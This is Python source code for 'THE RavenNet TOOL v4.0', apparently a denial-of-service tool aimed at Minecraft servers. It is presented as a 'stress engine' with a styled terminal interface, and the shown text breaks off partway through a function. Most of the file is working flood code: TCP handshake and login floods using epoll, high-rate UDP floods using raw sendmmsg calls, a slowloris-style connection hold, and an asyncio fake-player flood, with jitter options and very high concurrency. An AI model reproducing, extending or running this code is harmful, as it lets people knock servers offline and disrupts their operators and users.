#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""THE RavenNet TOOL v4.0 — Cybermochi Crimson Reskin (single-file build)"""
import os, sys, time, socket, struct, random, threading, json, zlib, re, gc, ctypes
import select as _select
import multiprocessing as mp
import asyncio
from datetime import datetime

gc.disable()
threading.stack_size(65536)

try:
    import psutil
    PSUTIL = True
except Exception:
    PSUTIL = False

# ── Force UTF-8 + ANSI (Windows) ─────────────────────────────
if hasattr(sys.stdout, 'reconfigure'):
    try: sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception: pass
if hasattr(sys.stderr, 'reconfigure'):
    try: sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception: pass
if os.name == 'nt':
    os.system('')

# ── ANSI / RGB SYSTEM ────────────────────────────────────────
RESET="\033[0m"; BOLD="\033[1m"; DIM="\033[2m"
HIDE="\033[?25l"; SHOW="\033[?25h"; CLS_LINE="\033[2K"
def rgb(r,g,b): return f"\033[38;2;{r};{g};{b}m"
def bg(r,g,b):  return f"\033[48;2;{r};{g};{b}m"
def mv(row,col):return f"\033[{row};{col}H"
def lerp(c1,c2,t):
    return (int(c1[0]+(c2[0]-c1[0])*t),
            int(c1[1]+(c2[1]-c1[1])*t),
            int(c1[2]+(c2[2]-c1[2])*t))

# Dark Red Cyberpunk Palette
NEON_RED  = rgb(255, 45, 45)
VIVID_RED = rgb(225, 30, 30)
MID_RED   = rgb(160, 18, 18)
DEEP_RED  = rgb(95, 10, 10)
SHADOW    = rgb(55, 5, 5)
BLOOD     = rgb(28, 3, 3)
BORDER    = rgb(170, 22, 22)
ACCENT    = rgb(255, 60, 60)
DIM_RED   = rgb(130, 28, 28)
GHOST     = rgb(80, 15, 15)
AMBER     = rgb(245, 158, 11)
GREEN     = rgb(40, 220, 80)
WHITE     = rgb(255, 255, 255)
SILVER    = rgb(210, 220, 230)
MUTED     = rgb(140, 150, 165)
CYAN = ACCENT; VIOLET = MID_RED; LIGHT_GRAY = SILVER
MED_GRAY = MUTED; DARK_GRAY = DIM_RED; BORDER_GRAY = BORDER
RED = VIVID_RED; YELLOW = AMBER

def clear(): os.system('cls' if os.name=='nt' else 'clear')
def W():
    try: return os.get_terminal_size().columns
    except: return 90

def log(msg, level="INFO"):
    now = datetime.now().strftime("%H:%M:%S")
    icons = {"INFO":("[+]",GREEN),"WARN":("[!]",AMBER),
             "ERROR":("[-]",rgb(255,80,80)),"RavenNet":("[M]",NEON_RED)}
    ic, col = icons.get(level, ("[*]",WHITE))
    print(f"  {GHOST}[{now}]{RESET} {col}{ic}{RESET} {SILVER}{msg}{RESET}")

# ── YOUR ASCII ART (RavenNet SKULL) ──────────────────────────────
BANNER = [
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣏⠻⣿⣿⠿⣓⣤⣴⣶⣿⣿⣿⣿⣿⣿⣶⡦⣀⣴⣿⣿⣿⡿⢛⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⡄⣤⣶⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⢟⣥⣾⣿⣿⣿⢟⣍⡀⣾⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣧⢻⣿⡿⠛⠹⣷⣾⣿⣷⣦⡀⢾⣿⣿⣿⠟⠋⢷⣿⣿⣿⣬⡻⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⢿⣿⣿⡞⠁⠀⠀⠀⠀⠙⠿⣿⣿⣿⣶⣝⠋⠁⠀⠀⠀⠙⢿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡘⣿⣿⣿⡀⠀⠀⣀⣴⣿⣿⣮⡻⢿⣿⣿⣿⣦⡀⠀⠀⠀⣾⡝⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡷⢹⣿⡿⢇⣤⣾⣿⣿⣿⠟⠉⠀⠀⠉⠻⣿⣿⣿⣷⣤⢰⣿⣿⡎⢿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⠀⢈⣯⣾⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⢃⣿⣿⣿⠁⠈⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡇⣶⣿⣿⣿⡿⣛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣾⣿⣿⢇⣾⣦⡹⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⣿⣿⠟⢷⣾⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⢸⣿⣿⣿⣦⣝⠷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣞⢻⣿⣿⡇⠉⠀⠀⠸⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⠃⠀⠉⠻⢿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⠼⣿⣿⣷⠀⠀⠀⠀⢻⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡏⠀⠀⠀⠀⣷⣝⠿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⣠⣶⣿⣿⣿⣿⣛⣁⣀⣻⣛⣛⣧⣀⣀⣀⣈⣿⣿⣿⡀⣀⣀⣀⣀⣀⠀⢀⢀⣰⠿⠿⠿⠀⠀⠀⠀⣼⣿⣿⡟⠈⠛⢿⣿⣿⣿⣦⣀⠀⠀⠀⠀",
    r"⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣷⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣴⣿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀",
    r"⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⢻⣯⣭⣭⣉⠋⠁⢿⣿⣿⡎⠛⠛⠛⠛⠛⠛⣟⣛⣛⠛⠛⠛⣫⣾⣿⣿⠟⠚⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠂",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣷⣤⣘⠿⣿⣿⡀⠀⠀⠀⠀⢰⣿⣿⡿⣀⣴⣾⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣶⣮⣥⣀⣀⣀⣀⣿⣿⣿⢣⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠿⣿⣿⣿⣿⣿⡟⣼⣿⣿⡏⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣾⣭⣭⠉⢱⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣆⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
    r"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀",
]
GLITCH_CHARS = "█▓▒░▄▀╔╗╝╚╠╣╦╩╬"

def center_banner_lines(art):
    """Center each art line within terminal width."""
    w = W()
    out = []
    for line in art:
        vis = len(line)
        pad = max((w - vis) // 2, 0)
        out.append(" " * pad + line)
    return out

# ── MATRIX RAIN INTRO ────────────────────────────────────────
MATRIX_CHARS = (
    "ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ"
    "アイウエオカキクケコサシスセソタチツテトナニヌネノ"
    "0123456789ABCDEF"
    "!@#$%^&*<>?/|\\~`{}[]█▓▒░▄▀▌▐■□▪▫"
    "⣿⣷⣯⣟⡿⢿⣻⣽"
)

def matrix_rain(duration=4.0):
    w = W(); h = 32
    cnt = min(w - 4, 65)
    all_pos = list(range(2, w - 1))
    random.shuffle(all_pos)
    cols = all_pos[:cnt]
    heads = {c: random.randint(0, h) for c in cols}
    speeds = {c: random.choice([1, 1, 1, 2]) for c in cols}
    trails = {c: [] for c in cols}
    TRAIL = 20
    clear()
    sys.stdout.write(HIDE)
    sys.stdout.write(BLOOD)
    for row in range(1, h + 1):
        sys.stdout.write(mv(row, 1) + " " * (w - 1))
    sys.stdout.write(RESET); sys.stdout.flush()

    status_msgs = ["ARMING...", "SYNCING...", "CONNECTING...", "SPOOFING...", "LOADING..."]
    ov_idx = 0; tick = 0; start = time.time()
    while time.time() - start < duration:
        elapsed = time.time() - start; frame = []
        for c in cols:
            r = heads[c]
            ch = random.choice(MATRIX_CHARS)
            p = random.random()
            if p < 0.15:   hc = f"{rgb(255,255,255)}{BOLD}"
            elif p < 0.25: hc = f"{rgb(255,180,180)}{BOLD}"
            else:          hc = f"{rgb(255,50,50)}{BOLD}"
            frame.append((r % h + 1, c, ch, True, hc))
            for i, (tr, tc, tch) in enumerate(trails[c]):
                nr, ng, nb = lerp((200, 15, 15), (25, 2, 2), i / TRAIL)
                dch = random.choice(MATRIX_CHARS) if random.random() < 0.04 else tch
                frame.append((tr, tc, dch, False, rgb(nr, ng, nb)))
            trails[c].insert(0, (r % h + 1, c, ch))
            if len(trails[c]) > TRAIL:
                old = trails[c].pop()
                frame.append((old[0], old[1], ' ', False, ""))
            heads[c] = (heads[c] + speeds[c]) % h
        if tick % 8 == 0:
            frame.append((random.randint(1, h), random.randint(2, w - 2),
                          random.choice(MATRIX_CHARS), True, f"{rgb(255,255,200)}{BOLD}"))
        out = []
        for item in frame:
            row, col = item[0], item[1]
            if row < 1 or row > h: continue
            out.append(mv(row, col)); out.append(f"{item[4]}{item[2]}{RESET}")
        if tick % 16 == 0:
            ov_idx = (ov_idx + 1) % len(status_msgs)
        smsg = status_msgs[ov_idx]
        sc = rgb(180, 20, 20) if tick % 6 < 3 else rgb(255, 50, 50)
        out.append(mv(h - 1, max(w - 18, 2))); out.append(f"{sc}{BOLD}[ {smsg} ]{RESET}")
        prog = elapsed / duration; pb_w = 30
        filled = int(prog * pb_w)
        out.append(mv(h, max(w // 2 - pb_w // 2, 1)))
        out.append(f"{rgb(180,15,15)}{'█'*filled}{'░'*(pb_w-filled)}{RESET} {rgb(255,40,40)}{int(prog*100):>3}%{RESET}")
        sys.stdout.write("".join(out)); sys.stdout.flush()
        time.sleep(0.028); tick += 1

# ── BOOT SEQUENCE ────────────────────────────────────────────
def boot_sequence():
    matrix_rain(duration=3.5)
    clear()
    sys.stdout.write(HIDE)
    items = [
        ("KERN  ", "Cybermochi v3.0 kernel initialized"),
        ("RavenNet  ", "Stress engine modules loaded (epoll/sendmmsg)"),
        ("PROXY ", "Gateway connection established [TLS 1.3]"),
        ("RAW   ", "Raw-SYN socket handler armed"),
        ("AMP   ", "Status amplification templates cached"),
        ("SYS   ", "All subsystems nominal — launching HUD"),
    ]
    for tag, msg in items:
        ts = datetime.now().strftime("%H:%M:%S")
        p1 = f"  {GHOST}[{RESET}{DIM_RED}{ts}{RESET}{GHOST}]{RESET}"
        p2 = f" {GHOST}[{RESET}{VIVID_RED}{BOLD}{tag}{RESET}{GHOST}]{RESET}"
        sys.stdout.write(f"{p1}{p2}  {MUTED}{msg}{RESET}\n")
        sys.stdout.flush(); time.sleep(0.04)
    time.sleep(0.15)
    sys.stdout.write(SHOW)

# ── BANNER (glowing sweep + steady gradient) ─────────────────
def print_banner(skip_boot=False):
    sys.stdout.write(HIDE)
    if not skip_boot:
        boot_sequence()
    clear()

    C_DARK = (55, 6, 6); C_MID = (165, 18, 18)
    C_HOT = (250, 50, 50); C_WHITE = (255, 255, 255)

    w = max(len(l) for l in BANNER)
    STEPS = 20; PASSES = 2
    art_centered = center_banner_lines(BANNER)

    for step in range(STEPS * PASSES):
        wc = ((step % STEPS) / (STEPS - 1)) * (w + 20) - 10
        sys.stdout.write("\033[H")
        rows = []
        for line in art_centered:
            row = []
            for ci, ch in enumerate(line):
                if ch in (' ', '⠀'):
                    row.append(' '); continue
                d = abs(ci - wc)
                if d < 4:    r2,g2,b2 = lerp(C_WHITE, C_HOT, d/4.0)
                elif d < 12: r2,g2,b2 = lerp(C_HOT,  C_MID, (d-4)/8.0)
                elif d < 24: r2,g2,b2 = lerp(C_MID, C_DARK, (d-12)/12.0)
                else:         r2,g2,b2 = C_DARK
                row.append(f"{rgb(r2,g2,b2)}{ch}")
            rows.append("".join(row) + RESET)
        sys.stdout.write("\n".join(rows) + "\n")
        sys.stdout.flush(); time.sleep(0.016)

    # Steady gradient
    sys.stdout.write("\033[H")
    for i, line in enumerate(art_centered):
        t = i / (len(art_centered) - 1)
        r2,g2,b2 = lerp((255, 50, 50), (140, 14, 14), t)
        sys.stdout.write(f"{rgb(r2,g2,b2)}{BOLD}{line}{RESET}\n")

    # Animated divider HUD
    tag_inner = (f"{NEON_RED}═▶ {RESET}{WHITE}{BOLD}THE RavenNet TOOL v4.0{RESET}"
                 f"  {DIM_RED}│{RESET}  {MUTED}stress engine{RESET}  {NEON_RED}◀═{RESET}")
    tag_vis_len = 52
    w_t = W(); side = max((w_t - tag_vis_len) // 2, 2)
    sys.stdout.write(f"\n{GHOST}{'═'*side}{tag_inner}{GHOST}{'═'*side}{RESET}\n")
    sys.stdout.write(SHOW); sys.stdout.flush()

# ── SHARED COUNTERS ──────────────────────────────────────────
class Counters:
    def __init__(self):
        self.packets = mp.Value('Q', 0)
        self.bytes = mp.Value('Q', 0)
        self.lock = mp.Lock()
    def add(self, p, b):
        with self.lock:
            self.packets.value += p
            self.bytes.value += b

# ── PROTOCOL PRIMITIVES ──────────────────────────────────────
PROTO_POOL = [47, 340, 754, 760, 763, 767, 768]

def varint_encode(v):
    d = b''
    while True:
        t = v & 0x7F; v >>= 7
        if v: t |= 0x80
        d += struct.pack('B', t)
        if not v: return d

def decode_varint(data):
    num = shift = 0
    for i, b in enumerate(data):
        num |= (b & 0x7F) << shift
        if not (b & 0x80): return num, i+1
        shift += 7
        if shift > 35: raise ValueError("varint")
    raise ValueError("truncated")

def read_varint_sock(s):
    num = shift = 0
    while True:
        b = s.recv(1)
        if not b: raise ConnectionError("eof")
        v = b[0]
        num |= (v & 0x7F) << shift
        if not (v & 0x80): return num
        shift += 7
        if shift > 35: raise ValueError("varint")

def build_handshake(proto, host, port, intent=1):
    pkt = b'\x00' + varint_encode(proto) + varint_encode(len(host)) + host.encode('utf-8','replace') \
          + struct.pack('>H', port) + varint_encode(intent)
    return varint_encode(len(pkt)) + pkt

def build_status_request(port, proto=767, host="localhost"):
    return build_handshake(proto, host, port, 1) + b'\x01\x00'

def prebuild_packets(mode, port, pool_size=512):
    pool = []
    for _ in range(pool_size):
        host = f"m{random.randint(1000,9999)}.usr"
        if mode == 'status':
            pool.append(build_status_request(port, random.choice(PROTO_POOL), host))
        elif mode == 'connect':
            pool.append(b'')
        else:
            h = build_handshake(random.choice(PROTO_POOL), host, port, 2)
            name = f"RavenNet_{random.randint(10000,99999)}"
            l = b'\x00' + varint_encode(len(name)) + name.encode('utf-8','replace')
            pool.append(h + varint_encode(len(l)) + l)
    return pool

# ── EPOLL TCP ENGINE ─────────────────────────────────────────
def handshake_epoll(ip, port, cfg, stop, cnt):
    mode = cfg.get('mode','handshake')
    concurrency = int(cfg.get('concurrency', 5000))
    jitter = cfg.get('jitter', False)
    family = int(cfg.get('family', 4))
    sfam = socket.AF_INET6 if family == 6 else socket.AF_INET
    addr = (ip, port, 0, 0) if family == 6 else (ip, port)
    try:
        pool = prebuild_packets(mode, port, int(cfg.get('pool_size', 512)))
    except Exception:
        pool = [b'']
    try:
        ep = _select.epoll()
    except (AttributeError, OSError):
        return handshake_threaded(ip, port, cfg, stop, cnt, pool)
    socks = {}; lp = lb = 0; sweep = 0
    while not stop.is_set():
        want = concurrency - len(socks)
        if want > 0:
            for _ in range(want):
                s = None
                try:
                    s = socket.socket(sfam, socket.SOCK_STREAM)
                    s.setblocking(False)
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.connect(addr)
                except BlockingIOError:
                    pass
                except OSError:
                    if s is not None:
                        try: s.close()
                        except Exception: pass
                    continue
                else:
                    try:
                        d = random.choice(pool)
                        if d: s.sendall(d)
                        lp += 1; lb += len(d)
                    except OSError:
                        pass
                    finally:
                        try: s.close()
                        except Exception: pass
                    continue
                try:
                    ep.register(s.fileno(), _select.EPOLLOUT)
                    socks[s.fileno()] = (s, random.choice(pool), time.time())
                except OSError:
                    try: s.close()
                    except Exception: pass
        try:
            events = ep.poll(0)
        except OSError:
            events = []
        now = time.time()
        for fd, ev in events:
            entry = socks.pop(fd, None)
            if entry is None: continue
            s, data, _ = entry
            try:
                if data: s.sendall(data)
                lp += 1; lb += len(data)
            except OSError:
                pass
            finally:
                try: s.close()
                except Exception: pass
        sweep += 1
        if sweep % 500 == 0:
            stale = [fd for fd,(s,d,t0) in socks.items() if now - t0 > 20]
            for fd in stale:
                entry = socks.pop(fd, None)
                if entry:
                    try: ep.unregister(fd)
                    except Exception: pass
                    try: entry[0].close()
                    except Exception: pass
        if lp >= 4096:
            cnt.add(lp, lb); lp = lb = 0
        if jitter and random.random() < 0.02:
            time.sleep(random.uniform(0.2, 1.2))
    cnt.add(lp, lb)

def handshake_threaded(ip, port, cfg, stop, cnt, pool):
    threads = min(int(cfg.get('concurrency', 5000)) // 100 + 1, 400)
    def loop():
        lp = lb = 0
        while not stop.is_set():
            try:
                s = socket.create_connection((ip, port), timeout=2)
                d = random.choice(pool)
                if d: s.sendall(d)
                lp += 1; lb += len(d)
                s.close()
            except OSError:
                time.sleep(0.01)
            if lp >= 2048:
                cnt.add(lp, lb); lp = lb = 0
        cnt.add(lp, lb)
    ts = [threading.Thread(target=loop, daemon=True) for _ in range(threads)]
    for t in ts: t.start()
    while not stop.is_set():
        time.sleep(0.5)
    for t in ts: t.join(1)

# ── UDP / sendmmsg ───────────────────────────────────────────
class IOV(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]
class MSGHDR(ctypes.Structure):
    _fields_ = [("msg_name", ctypes.c_void_p), ("msg_namelen", ctypes.c_uint32),
                ("_pad", ctypes.c_uint32), ("msg_iov", ctypes.POINTER(IOV)),
                ("msg_iovlen", ctypes.c_size_t), ("msg_control", ctypes.c_void_p),
                ("msg_controllen", ctypes.c_size_t), ("msg_flags", ctypes.c_int),
                ("_pad2", ctypes.c_uint32)]
class MMHDR(ctypes.Structure):
    _fields_ = [("msg_hdr", MSGHDR), ("msg_len", ctypes.c_uint32)]
class SOCKADDR_IN(ctypes.Structure):
    _fields_ = [("sin_family", ctypes.c_ushort), ("sin_port", ctypes.c_ushort),
                ("sin_addr", ctypes.c_ubyte * 4), ("sin_zero", ctypes.c_ubyte * 8)]

def _sendmmsg_available():
    if os.name != 'posix' or not hasattr(_select, 'epoll'): return False
    try:
        libc = ctypes.CDLL(None, use_errno=True)
        if not hasattr(libc, 'sendmmsg'): return False
        libc.sendmmsg.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_uint, ctypes.c_int]
        libc.sendmmsg.restype = ctypes.c_ssize_t
        if ctypes.sizeof(MSGHDR) != 56 or ctypes.sizeof(MMHDR) != 64: return False
        return libc
    except Exception:
        return False

_LIBC = _sendmmsg_available()

def build_mmsg_batch(sock, payload, dest, n=32):
    buf = ctypes.create_string_buffer(payload, len(payload))
    ip_b = socket.inet_aton(dest[0])
    sa = SOCKADDR_IN(socket.AF_INET, socket.htons(dest[1]),
                     (ip_b[0], ip_b[1], ip_b[2], ip_b[3]), (0,)*8)
    iov = IOV(ctypes.cast(buf, ctypes.c_void_p), len(payload))
    hdr = MSGHDR(ctypes.cast(ctypes.pointer(sa), ctypes.c_void_p), 16, 0,
                 ctypes.pointer(iov), 1, None, 0, 0, 0)
    arr = (MMHDR * n)()
    for i in range(n):
        arr[i].msg_hdr = hdr
        arr[i].msg_len = 0
    return buf, sa, arr

def udp_batched(ip, port, size, delay, jitter, stop, cnt, family=4):
    sfam = socket.AF_INET6 if family == 6 else socket.AF_INET
    addr = (ip, port, 0, 0) if family == 6 else (ip, port)
    sock = socket.socket(sfam, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8*1024*1024)
    payload = os.urandom(size)
    lp = lb = 0
    while not stop.is_set():
        for _ in range(64):
            try:
                sock.sendto(payload, addr)
            except OSError:
                time.sleep(0.0005)
                break
        lp += 64; lb += 64*size
        if delay: time.sleep(delay/1000.0)
        if lp >= 4096:
            cnt.add(lp, lb); lp = lb = 0
        if jitter and random.random() < 0.02:
            time.sleep(random.uniform(0.2, 1.2))
    cnt.add(lp, lb)

def udp_sendmmsg(ip, port, size, delay, jitter, stop, cnt):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8*1024*1024)
    payload = os.urandom(size)
    n = 32
    buf, sa, arr = build_mmsg_batch(sock, payload, (ip, port), n)
    lp = lb = 0
    while not stop.is_set():
        sent = _LIBC.sendmmsg(sock.fileno(), ctypes.byref(arr), n, 0)
        if sent > 0:
            lp += sent; lb += sent*size
        elif sent < 0:
            time.sleep(0.001)
        if delay: time.sleep(delay/1000.0)
        if lp >= 4096:
            cnt.add(lp, lb); lp = lb = 0
        if jitter and random.random() < 0.02:
            time.sleep(random.uniform(0.2, 1.2))
    cnt.add(lp, lb)

def udp_worker(ip, port, cfg, stop, cnt):
    size = int(cfg.get('size', 1400))
    delay = int(cfg.get('delay_ms', 0))
    jitter = cfg.get('jitter', False)
    family = int(cfg.get('family', 4))
    if _LIBC and family == 4:
        try:
            return udp_sendmmsg(ip, port, size, delay, jitter, stop, cnt)
        except Exception:
            pass
    return udp_batched(ip, port, size, delay, jitter, stop, cnt, family)

# ── SLOWLORIS HOLD ───────────────────────────────────────────
def slowloris_hold(ip, port, cfg, stop, cnt):
    target = int(cfg.get('concurrency', 2000))
    family = int(cfg.get('family', 4))
    sfam = socket.AF_INET6 if family == 6 else socket.AF_INET
    addr = (ip, port, 0, 0) if family == 6 else (ip, port)
    while not stop.is_set():
        socks = []
        while len(socks) < target and not stop.is_set():
            try:
                s = socket.socket(sfam, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect(addr)
                d = build_handshake(random.choice(PROTO_POOL),
                                    f"s{random.randint(1000,9999)}.usr", port, 2)
                s.sendall(d)
                socks.append(s)
                cnt.add(1, len(d))
            except OSError:
                time.sleep(0.05)
        hold = random.uniform(16, 24)
        t0 = time.time()
        while not stop.is_set() and time.time() - t0 < hold:
            time.sleep(1)
        for s in socks:
            try: s.close()
            except Exception: pass

# ── FAKE PLAYER HOLD (asyncio) ───────────────────────────────
def fake_player_process(ip, port, cfg, stop, cnt):
    slots = int(cfg.get('concurrency', 8000))
    proto = int(cfg.get('protocol', 767))
    modern = proto >= 764

    async def read_varint(r):
        num = shift = 0
        while True:
            b = await asyncio.wait_for(r.readexactly(1), 20)
            v = b[0]
            num |= (v & 0x7F) << shift
            if not (v & 0x80): return num
            shift += 7
            if shift > 35: raise ValueError("varint")

    async def handle(sem, acc):
        async with sem:
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), 4)
            except Exception:
                return
            try:
                name = f"MP{random.randint(10000,99999)}"
                h = build_handshake(proto, f"f{random.randint(1000,9999)}.usr", port, 2)
                l = b'\x00' + varint_encode(len(name)) + name.encode('utf-8','replace')
                w.write(h + varint_encode(len(l)) + l)
                await w.drain()
                acc[0] += 1; acc[1] += len(h) + len(l)
                comp = False; threshold = 0
                while not stop.is_set():
                    try:
                        plen = await read_varint(r)
                    except Exception:
                        break
                    if plen <= 0: continue
                    try:
                        data = await asyncio.wait_for(r.readexactly(plen), 20)
                    except Exception:
                        break
                    if comp:
                        try:
                            ulen, off = decode_varint(data)
                        except Exception:
                            break
                        raw = data[off:] if ulen == 0 else zlib.decompress(data[off:])
                        if not raw: break
                        pid, body = raw[0], raw[1:]
                    else:
                        pid, body = data[0], data[1:]
                    if pid == 0x03:
                        threshold, _ = decode_varint(body)
                        comp = threshold > 0
                    elif pid == 0x02 and modern:
                        w.write(varint_encode(1) + b'\x03')
                        await w.drain()
                    elif pid in (0x0F, 0x24):
                        payload = bytes([pid]) + body
                        if comp:
                            dl = varint_encode(len(payload))
                            frame_body = (dl + zlib.compress(payload)) if len(payload) >= threshold else (dl + payload)
                        else:
